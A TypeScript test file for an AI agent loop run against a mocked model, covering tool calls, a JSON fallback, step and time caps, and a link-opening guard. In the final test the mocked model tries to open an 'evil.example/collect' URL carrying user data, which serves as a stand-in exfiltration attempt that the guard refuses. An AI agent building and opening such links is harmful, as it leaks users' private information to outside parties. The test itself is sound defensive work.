// The agent loop with a mock brain: native tool calls, a model without tools (JSON way, remembered), one that
// writes the JSON way while it has tools, the caps (lookups, steps, time).
import { beforeEach, describe, expect, it, vi } from 'vitest';
import type { AgentMessage, Brain } from '../types';
import type { ToolName } from './tools';

const steps: ((req: { messages: AgentMessage[]; tools?: unknown[] }) => unknown)[] = [];
const generated: ((req: { system: string; messages: { content: string }[] }) => string)[] = [];
const ran: { name: string; args: Record<string, unknown> }[] = [];

vi.mock('./step', async (orig) => {
  const real = await orig<typeof import('./step')>();
  return {
    ...real,
    modelStep: vi.fn(async (_brain: Brain, req: { messages: AgentMessage[]; tools?: unknown[] }) => {
      const next = steps.shift();
      if (!next) throw new Error('no more steps');
      return next(req);
    }),
  };
});
vi.mock('../ai/generate', () => ({
  NoModelError: class extends Error {},
  generate: vi.fn(async (_brain: Brain, req: { system: string; messages: { content: string }[] }) => {
    const next = generated.shift();
    if (!next) throw new Error('no more answers');
    return next(req);
  }),
}));
vi.mock('./tools', async (orig) => {
  const real = await orig<typeof import('./tools')>();
  return {
    ...real,
    runTool: vi.fn(async (name: string, args: Record<string, unknown>) => {
      ran.push({ name, args });
      return { ok: true, content: JSON.stringify({ found: `${name}:${JSON.stringify(args)}`, link: 'https://docs.example.com/q4' }), what: `Looked at ${name}` };
    }),
  };
});

const { runAgent, toolMode, readAction, flatten, AgentTimeout } = await import('./loop');
const { ToolsUnsupportedError } = await import('./step');

const brain: Brain = { id: 'b1', createdAt: 0, updatedAt: 0, name: 'Test brain', kind: 'openai', preset: 'ollama', baseUrl: 'http://localhost:11434/v1', model: 'qwen3:4b', transport: 'device' } as Brain;
const ctx = { connections: {}, units: 'metric' as const, headlines: [], purpose: 'research' as const };
const task = (over: Partial<Parameters<typeof runAgent>[0]> = {}) => ({
  brain,
  system: 'Research.',
  user: 'ITEM: Q4 budget review',
  tools: ['calendar_event', 'email_search'] as ToolName[],
  ctx,
  maxSteps: 4,
  maxCalls: 4,
  deadline: Date.now() + 30_000,
  answer: 'json' as const,
  ...over,
});

beforeEach(() => {
  steps.length = 0;
  generated.length = 0;
  ran.length = 0;
});

describe('agent loop', () => {
  it('native: asks for lookups, gets the results, answers', async () => {
    steps.push(
      (req) => {
        expect(req.tools).toHaveLength(2);
        return { text: '', toolCalls: [{ id: 'c1', name: 'calendar_event', args: { id: 'cal:1' } }, { id: 'c2', name: 'email_search', args: { query: 'budget' } }] };
      },
      (req) => {
        const tools = req.messages.filter((m) => m.role === 'tool');
        expect(tools.map((m) => (m as { toolCallId: string }).toolCallId)).toEqual(['c1', 'c2']);
        return { text: '{"about":"The Q4 budget review.","who":["Dana Reyes"]}', toolCalls: [] };
      },
    );
    const r = await runAgent({ ...task(), tools: ['calendar_event', 'email_search'] });
    expect(r.mode).toBe('native');
    expect(r.json).toEqual({ about: 'The Q4 budget review.', who: ['Dana Reyes'] });
    expect(r.calls.map((c) => c.name)).toEqual(['calendar_event', 'email_search']);
    expect(r.steps).toBe(2);
  });

  it('a model without tools: the JSON way, and the brain is remembered', async () => {
    steps.push(() => {
      throw new ToolsUnsupportedError('registry.ollama.ai/library/gemma3 does not support tools');
    });
    generated.push(
      (req) => {
        expect(req.system).toContain('{"tool": "<lookup name>", "args": {...}}');
        expect(req.system).toContain('- calendar_event {"id": ...}');
        return 'Sure! {"tool":"calendar_event","args":{"id":"cal:1"}}';
      },
      (req) => {
        expect(req.messages.at(-1)!.content).toMatch(/^RESULT of calendar_event: /);
        return '```json\n{"done":{"about":"Budget review with Dana."}}\n```';
      },
    );
    const r = await runAgent({ ...task(), tools: ['calendar_event'] });
    expect(r.mode).toBe('json');
    expect(r.json).toEqual({ about: 'Budget review with Dana.' });
    expect(ran).toEqual([{ name: 'calendar_event', args: { id: 'cal:1' } }]);
    expect(await toolMode(brain)).toBe('json');
    // next time it goes straight to the JSON way
    generated.push(() => '{"done":"Dana and Mike are coming."}');
    const again = await runAgent({ ...task(), tools: ['calendar_event'], answer: 'text' });
    expect(again.text).toBe('Dana and Mike are coming.');
    expect(again.mode).toBe('json');
  });

  it('a model that writes the JSON way while it has tools is understood', async () => {
    const b2 = { ...brain, id: 'b2' };
    steps.push(
      () => ({ text: '{"tool": "email_search", "args": {"query": "Dana"}}', toolCalls: [] }),
      () => ({ text: 'Dana asked you to bring the vendor numbers.', toolCalls: [] }),
    );
    const r = await runAgent({ ...task(), brain: b2, tools: ['email_search'], answer: 'text' });
    expect(ran[0]).toEqual({ name: 'email_search', args: { query: 'Dana' } });
    expect(r.text).toBe('Dana asked you to bring the vendor numbers.');
  });

  it('caps: lookups per task, the last step answers without tools, unknown tools refused', async () => {
    const b3 = { ...brain, id: 'b3' };
    steps.push(
      () => ({ text: '', toolCalls: [{ id: 'a', name: 'email_search', args: { query: '1' } }, { id: 'b', name: 'web_search', args: { query: 'x' } }] }),
      (req) => {
        const results = req.messages.filter((m) => m.role === 'tool').map((m) => m.content);
        expect(results[1]).toMatch(/web_search is not available/);
        return { text: '', toolCalls: [{ id: 'c', name: 'email_search', args: { query: '2' } }] };
      },
      (req) => {
        // the last of 3 steps: no tools, everything found so far as plain text
        expect(req.tools).toBeUndefined();
        expect(req.messages).toHaveLength(1);
        expect(req.messages[0]!.content).toMatch(/WHAT YOUR LOOKUPS FOUND/);
        return { text: 'Done.', toolCalls: [] };
      },
    );
    const r = await runAgent({ ...task(), brain: b3, tools: ['email_search'], maxSteps: 3, maxCalls: 2, answer: 'text' });
    expect(ran.map((c) => c.args.query)).toEqual(['1', '2']);
    expect(r.text).toBe('Done.');
  });

  it('out of time: AgentTimeout', async () => {
    await expect(runAgent({ ...task(), brain: { ...brain, id: 'b4' }, deadline: Date.now() + 1000 })).rejects.toBeInstanceOf(AgentTimeout);
  });

  it('readAction and flatten', () => {
    expect(readAction('{"tool":"weather","args":{"day":"friday"}}')).toEqual({ tool: 'weather', args: { day: 'friday' } });
    expect(readAction('{"done":"yes"}')).toEqual({ done: 'yes' });
    expect(readAction('Plain answer.')).toEqual({ done: 'Plain answer.' });
    const f = flatten('Q', [{ role: 'tool', toolCallId: 'x', name: 'weather', content: '{"high":20}' }]);
    expect(f[0]!.content).toContain('- weather: {"high":20}');
  });
});

describe('open_link', () => {
  it('opens only links from the task or earlier lookups, never one the model built', async () => {
    const fresh = { ...brain, id: 'b-links' } as Brain;
    steps.push(
      () => ({
        text: '',
        toolCalls: [
          { id: 'l1', name: 'open_link', args: { url: 'https://evil.example/collect?d=Dana%20quotes' } },
          { id: 'l2', name: 'open_link', args: { url: 'https://agenda.example.com/q4/' } },
        ],
      }),
      (req) => {
        const results = req.messages.filter((m) => m.role === 'tool').map((m) => m.content);
        expect(results[0]).toMatch(/Only links that appear/);
        return { text: '', toolCalls: [{ id: 'l3', name: 'open_link', args: { url: 'https://docs.example.com/q4' } }] };
      },
      () => ({ text: '{"about":"The Q4 budget review."}', toolCalls: [] }),
    );
    const r = await runAgent({ ...task(), brain: fresh, user: 'ITEM: Q4 budget review, agenda https://agenda.example.com/q4', tools: ['open_link'] });
    expect(ran.map((c) => c.args.url)).toEqual(['https://agenda.example.com/q4/', 'https://docs.example.com/q4']);
    expect(r.json).toEqual({ about: 'The Q4 budget review.' });
  });
});
